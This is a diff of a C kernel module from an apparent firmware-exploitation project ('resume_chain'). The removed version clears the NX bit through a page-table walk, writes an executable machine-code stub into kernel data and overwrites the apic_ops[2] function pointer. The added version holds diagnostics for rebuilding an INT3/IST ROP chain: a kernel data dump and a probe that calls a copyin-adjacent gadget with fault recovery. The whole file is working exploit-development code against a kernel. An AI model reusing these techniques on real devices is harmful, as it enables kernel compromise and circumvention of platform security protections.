@@ -1,37 +1,25 @@
 #include <stdint.h>
 
 /*
- * resume_chain v4 — executable stub in kdata
+ * resume_chain v5 — diagnostics for INT3+IST chain debugging
  *
- * Instead of INT3+IST+ROP, write machine code into kdata, clear the NX bit
- * via page-table walk, and point apic_ops[2] at it.  The stub:
- *   (optional) wrmsr to set LSTAR
- *   restore apic_ops[2] to original get_timer_freq
- *   tail-call get_timer_freq → clean return to LAPIC resume caller
+ * The chain must point apic_ops[2] at ktext (NPT NX blocks non-ktext
+ * during suspend). Before rebuilding the chain, we need two diagnostics:
  *
  * Mode (via fw_ver):
- *   0x1: ARM — stub with wrmsr + tail-call get_timer_freq
- *   0x2: READBACK — check sentinel + LSTAR after resume
- *   0x3: ARM_SAFE — no stub, just report (sanity check)
- *   0x4: ARM_NO_WRMSR — stub WITHOUT wrmsr (isolates wrmsr vs mechanism)
+ *   0x1: KDATA_DUMP — dump kdata+0x000..0x8B8 (140 qwords) to check
+ *        whether our chain data area overlaps kernel globals
+ *   0x2: CC_BYTE_TEST — call copyin-1 from kproc with pcb_onfault,
+ *        determine whether it's 0xCC (INT3) or something else
  */
 
 #define MAGIC_RSCN       0x5253434E  /* "RSCN" */
 
 /* FW 4.03 offsets */
 #define APIC_OPS_OFF_KTEXT  0x1934AC8
+#define OFF_COPYIN         (-0x9908e0)
 
-/* kdata layout */
-#define STUB_OFF         0x900    /* machine code stub */
-#define SENTINEL_OFF     0x0F8    /* fired-sentinel */
-#define SENTINEL_VAL     0x434841494E464952ULL  /* "CHAINFIR" */
-
-#define MSR_LSTAR        0xC0000082
-#define DMAP_BASE        0xFFFF800000000000ULL
-#define PTE_NX           (1ULL << 63)
-#define PTE_PS           (1ULL << 7)
-#define PTE_PRESENT      (1ULL)
-#define PTE_PHYS_MASK    0x000FFFFFFFFFF000ULL
+#define MSR_LSTAR          0xC0000082
 
 typedef struct {
     uint64_t kdata_base;
@@ -55,50 +43,6 @@ static inline void write8(uint64_t addr, uint64_t val)
     *(volatile uint64_t *)addr = val;
 }
 
-/*
- * Walk the 4-level page table to clear the NX bit for a given VA.
- * Returns 0 on success, negative on error.  Reports old PTE via *old_pte.
- */
-static int clear_nx(uint64_t va, uint64_t *old_pte)
-{
-    uint64_t cr3;
-    __asm__ volatile("mov %%cr3, %0" : "=r"(cr3));
-
-    volatile uint64_t *pml4 = (volatile uint64_t *)(DMAP_BASE + (cr3 & PTE_PHYS_MASK));
-    uint64_t pml4e = pml4[(va >> 39) & 0x1FF];
-    if (!(pml4e & PTE_PRESENT)) return -1;
-
-    volatile uint64_t *pdp = (volatile uint64_t *)(DMAP_BASE + (pml4e & PTE_PHYS_MASK));
-    uint64_t pdpe = pdp[(va >> 30) & 0x1FF];
-    if (!(pdpe & PTE_PRESENT)) return -2;
-    if (pdpe & PTE_PS) {
-        /* 1GB page */
-        *old_pte = pdpe;
-        pdp[(va >> 30) & 0x1FF] = pdpe & ~PTE_NX;
-        goto flush;
-    }
-
-    volatile uint64_t *pd = (volatile uint64_t *)(DMAP_BASE + (pdpe & PTE_PHYS_MASK));
-    uint64_t pde = pd[(va >> 21) & 0x1FF];
-    if (!(pde & PTE_PRESENT)) return -3;
-    if (pde & PTE_PS) {
-        /* 2MB page */
-        *old_pte = pde;
-        pd[(va >> 21) & 0x1FF] = pde & ~PTE_NX;
-        goto flush;
-    }
-
-    volatile uint64_t *pt = (volatile uint64_t *)(DMAP_BASE + (pde & PTE_PHYS_MASK));
-    uint64_t pte = pt[(va >> 12) & 0x1FF];
-    if (!(pte & PTE_PRESENT)) return -4;
-    *old_pte = pte;
-    pt[(va >> 12) & 0x1FF] = pte & ~PTE_NX;
-
-flush:
-    __asm__ volatile("invlpg (%0)" :: "r"(va) : "memory");
-    return 0;
-}
-
 int module_start(kproc_args *args)
 {
     uint64_t kdata_base = args->kdata_base;
@@ -112,150 +56,122 @@ int module_start(kproc_args *args)
     uint64_t lstar = rdmsr(MSR_LSTAR);
     uint64_t ktext_base = lstar - 0x294218;
 
-    uint64_t apic_ops_addr = ktext_base + APIC_OPS_OFF_KTEXT;
-    volatile uint64_t *apic = (volatile uint64_t *)apic_ops_addr;
-    uint64_t get_timer_freq = apic[19];
-    uint64_t orig_apic2 = apic[2];
-
     out32[0] = MAGIC_RSCN;
     out[1] = kdata_base;
     out[2] = ktext_base;
 
-    if (mode == 0x1 || mode == 0x4) {
+    if (mode == 0x1) {
         /*
-         * ARM MODE — executable stub approach
+         * MODE 1: KDATA DUMP
          *
-         * 1. Walk page tables, clear NX on kdata stub page
-         * 2. Write machine code stub to kdata + STUB_OFF
-         * 3. Point apic_ops[2] at the stub
+         * Dump 140 qwords starting at kdata_base+0x000.
+         * This reveals what kernel globals live at offsets 0x000..0x8B8
+         * where our chain data was being written.
          *
-         * Stub (mode 0x1, with wrmsr):
-         *   mov ecx, 0xC0000082       ; MSR_LSTAR
-         *   mov eax, <lstar_low>      ; value low 32
-         *   mov edx, <lstar_high>     ; value high 32
-         *   wrmsr                     ; set LSTAR
-         *   movabs r11, <&apic[2]>    ; address of apic_ops[2]
-         *   movabs rax, <orig_func>   ; original get_timer_freq
-         *   mov [r11], rax            ; restore apic_ops[2]
-         *   jmp rax                   ; tail-call → clean return
-         *
-         * Mode 0x4: same but without the wrmsr prefix (test mechanism).
+         * out[3..139] = kdata[0x000..0x448] (137 qwords, first 1096 bytes)
          */
-
-        uint64_t stub_va = kdata_base + STUB_OFF;
-        uint64_t apic2_ptr = apic_ops_addr + 2 * 8;
-
-        /* v1 safe test: write LSTAR back to its current value */
-        uint64_t new_lstar = lstar;
-
-        /* Step 1: clear NX on stub page */
-        uint64_t old_pte = 0;
-        int nx_rc = clear_nx(stub_va, &old_pte);
-
-        /* Step 2: write stub machine code */
-        volatile uint8_t *s = (volatile uint8_t *)stub_va;
-        int si = 0;
-
-        if (mode == 0x1) {
-            /* mov ecx, 0xC0000082 */
-            s[si++] = 0xB9;
-            s[si++] = 0x82; s[si++] = 0x00; s[si++] = 0x00; s[si++] = 0xC0;
-            /* mov eax, <lstar_low> */
-            s[si++] = 0xB8;
-            s[si++] = (new_lstar)       & 0xFF;
-            s[si++] = (new_lstar >> 8)  & 0xFF;
-            s[si++] = (new_lstar >> 16) & 0xFF;
-            s[si++] = (new_lstar >> 24) & 0xFF;
-            /* mov edx, <lstar_high> */
-            s[si++] = 0xBA;
-            s[si++] = (new_lstar >> 32) & 0xFF;
-            s[si++] = (new_lstar >> 40) & 0xFF;
-            s[si++] = (new_lstar >> 48) & 0xFF;
-            s[si++] = (new_lstar >> 56) & 0xFF;
-            /* wrmsr */
-            s[si++] = 0x0F; s[si++] = 0x30;
-        }
-
-        /* movabs r11, <&apic[2]> — 49 BB <8 bytes LE> */
-        s[si++] = 0x49; s[si++] = 0xBB;
-        for (int b = 0; b < 8; b++) s[si++] = (apic2_ptr >> (b * 8)) & 0xFF;
-
-        /* movabs rax, <get_timer_freq> — 48 B8 <8 bytes LE> */
-        s[si++] = 0x48; s[si++] = 0xB8;
-        for (int b = 0; b < 8; b++) s[si++] = (get_timer_freq >> (b * 8)) & 0xFF;
-
-        /* mov [r11], rax — 49 89 03 */
-        s[si++] = 0x49; s[si++] = 0x89; s[si++] = 0x03;
-
-        /* jmp rax — FF E0 */
-        s[si++] = 0xFF; s[si++] = 0xE0;
-
-        /* Step 3: write sentinel */
-        write8(kdata_base + SENTINEL_OFF, SENTINEL_VAL);
-
-        /* Step 4: point apic_ops[2] at our stub */
-        apic[2] = stub_va;
-
-        /* Report */
-        out[3]  = stub_va;
-        out[4]  = (uint64_t)nx_rc;
-        out[5]  = old_pte;
-        out[6]  = get_timer_freq;
-        out[7]  = orig_apic2;
-        out[8]  = apic2_ptr;
-        out[9]  = new_lstar;
-        out[10] = lstar;
-        out[11] = (uint64_t)si;     /* stub size in bytes */
-        out[12] = kdata_base + SENTINEL_OFF;
-
-        /* Read back first 8 bytes of stub (verify it's readable) */
-        out[13] = read8(stub_va);
-        out[14] = read8(stub_va + 8);
+        for (int i = 0; i < 137; i++)
+            out[3 + i] = read8(kdata_base + i * 8);
 
         out32[1] = 0x0001;
 
     } else if (mode == 0x2) {
-        /* READBACK MODE */
+        /*
+         * MODE 2: CC BYTE TEST
+         *
+         * Call copyin-1 from the kproc to test what byte is there.
+         * Uses pcb_onfault for fault recovery.
+         *
+         * Three possible outcomes:
+         *   result=1, RAX=sentinel → byte is 0xC3 (ret), returned immediately
+         *   result=1, RAX!=sentinel → byte is 0xCC (INT3), copyin ran, returned error
+         *   result=2 → byte caused a fault not caught by copyin's onfault
+         */
+        uint64_t cc_addr = kdata_base + OFF_COPYIN - 1;
+        uint64_t sentinel_val = 0xDEADBEEF12345678ULL;
+        uint64_t result_code = 0;
+        uint64_t rax_after = 0;
+        uint64_t rip_after = 0;
 
-        /* Sentinel */
-        uint64_t sentinel = read8(kdata_base + SENTINEL_OFF);
-        out[3] = sentinel;
-        out[4] = (sentinel == SENTINEL_VAL) ? 1 : 0;
+        /* Call the CC byte candidate with pcb_onfault protection */
+        __asm__ volatile(
+            /* Save callee-saved regs we'll use */
+            "pushq %%rbx\n"
+            "pushq %%r12\n"
+            "pushq %%r13\n"
+            "pushq %%r14\n"
+            "pushq %%r15\n"
 
-        /* Current LSTAR */
-        uint64_t cur_lstar = rdmsr(MSR_LSTAR);
-        out[5] = cur_lstar;
-        out[6] = (cur_lstar != lstar) ? 1 : 0;  /* changed? */
+            /* Get curthread → PCB → set onfault */
+            "movq %%gs:0, %%r12\n"           /* curthread */
+            "movq 0x3f8(%%r12), %%r13\n"     /* td_pcb */
+            "leaq 1f(%%rip), %%rax\n"        /* recovery address */
+            "movq %%rax, 0x108(%%r13)\n"     /* pcb_onfault = recovery */
 
-        /* Current apic_ops[2] */
-        out[7] = apic[2];
-        out[8] = get_timer_freq;
-        out[9] = (apic[2] == get_timer_freq) ? 1 : 0;  /* restored? */
+            /* Set sentinel in RAX */
+            "movq %[sentinel], %%rax\n"
 
-        /* Stub bytes (still there?) */
-        out[10] = read8(kdata_base + STUB_OFF);
-        out[11] = read8(kdata_base + STUB_OFF + 8);
+            /* Call the CC byte candidate */
+            "callq *%[cc]\n"
 
-        /* Restore apic_ops[2] if not already restored */
-        if (apic[2] != get_timer_freq) {
-            apic[2] = apic[18] - 8;  /* set_tpr - 8 trick */
+            /* Returned normally */
+            "movq $1, %[rc]\n"               /* result = 1 (returned) */
+            "movq %%rax, %[rax_out]\n"       /* save RAX */
+            "leaq (%%rip), %%rax\n"
+            "movq %%rax, %[rip_out]\n"       /* save current RIP */
+            "jmp 2f\n"
+
+            "1:\n"                           /* fault recovery entry */
+            "movq $2, %[rc]\n"               /* result = 2 (faulted) */
+            "movq %%rax, %[rax_out]\n"
+            "leaq (%%rip), %%rax\n"
+            "movq %%rax, %[rip_out]\n"
+
+            "2:\n"
+            /* Clear onfault */
+            "movq %%gs:0, %%r12\n"
+            "movq 0x3f8(%%r12), %%r13\n"
+            "movq $0, 0x108(%%r13)\n"
+
+            /* Restore callee-saved regs */
+            "popq %%r15\n"
+            "popq %%r14\n"
+            "popq %%r13\n"
+            "popq %%r12\n"
+            "popq %%rbx\n"
+
+            : [rc] "=&r"(result_code),
+              [rax_out] "=&r"(rax_after),
+              [rip_out] "=&r"(rip_after)
+            : [cc] "r"(cc_addr),
+              [sentinel] "r"(sentinel_val)
+            : "rax", "rcx", "rdx", "rdi", "rsi",
+              "r8", "r9", "r10", "r11", "memory", "cc"
+        );
+
+        out[3] = cc_addr;
+        out[4] = result_code;     /* 1=returned, 2=faulted */
+        out[5] = rax_after;       /* RAX after call */
+        out[6] = sentinel_val;    /* sentinel for comparison */
+        out[7] = rip_after;
+
+        /* Interpretation */
+        if (result_code == 1 && rax_after == sentinel_val) {
+            out[8] = 0xC3C3C3C3ULL; /* likely 0xC3 (ret) */
+        } else if (result_code == 1 && rax_after != sentinel_val) {
+            out[8] = 0xCCCCCCCCULL; /* likely 0xCC (INT3) → copyin ran */
+        } else {
+            out[8] = 0xBADBADBADULL; /* faulted — unknown byte */
         }
-        out[12] = apic[2];
 
-        out32[1] = 0x0001;
+        out[9] = kdata_base + OFF_COPYIN;  /* copyin addr for reference */
 
-    } else if (mode == 0x3) {
-        /* SAFE MODE — just report, no modifications */
-        out[3] = get_timer_freq;
-        out[4] = orig_apic2;
-        out[5] = lstar;
-        out[6] = apic_ops_addr;
         out32[1] = 0x0001;
 
     } else {
         out32[1] = 0xFF;
     }
 
-    out[131] = 0xdeadbeefcafe0040ULL;
+    out[131] = 0xdeadbeefcafe0050ULL;
     return 0;
 }
